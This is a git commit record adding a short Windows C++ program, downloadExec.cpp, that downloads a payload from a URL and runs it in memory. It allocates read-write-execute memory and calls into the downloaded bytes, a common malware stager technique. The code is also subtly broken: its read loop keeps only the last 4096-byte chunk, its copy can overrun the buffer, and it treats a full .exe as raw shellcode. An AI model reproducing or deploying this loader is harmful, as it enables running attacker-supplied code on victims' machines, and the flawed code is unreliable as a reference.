d21e307ab807d90c40bdcf1fea3cea571d13c008
3p1c0w3nd <143144804+3p1c0s3nd@users.noreply.github.com>
2023-11-20 20:56:09 -0500

    Create downloadExec.cpp

---
+++ downloadExec.cpp
@@ -0,0 +1,34 @@
+#include <windows.h>
+#include <wininet.h>
+#include <iostream>
+
+#pragma comment(lib, "wininet.lib")
+
+void ExecuteInMemory(const char* url) {
+    HINTERNET hInternet = InternetOpenA(NULL, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
+    HINTERNET hConnect = InternetOpenUrlA(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
+
+    BYTE buffer[4096];
+    DWORD bytesRead;
+    DWORD totalBytesRead = 0;
+
+    // Descargar el ejecutable en la memoria
+    while (InternetReadFile(hConnect, buffer, sizeof(buffer), &bytesRead) && bytesRead != 0) {
+        totalBytesRead += bytesRead;
+    }
+
+    // Ejecutar el código en la memoria
+    PVOID exec = VirtualAlloc(0, totalBytesRead, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    memcpy(exec, buffer, totalBytesRead);
+    ((void(*)())exec)();
+
+    InternetCloseHandle(hConnect);
+    InternetCloseHandle(hInternet);
+}
+
+int main() {
+    const char* url = "http://example.com/executable.exe";
+    ExecuteInMemory(url);
+
+    return 0;
+}
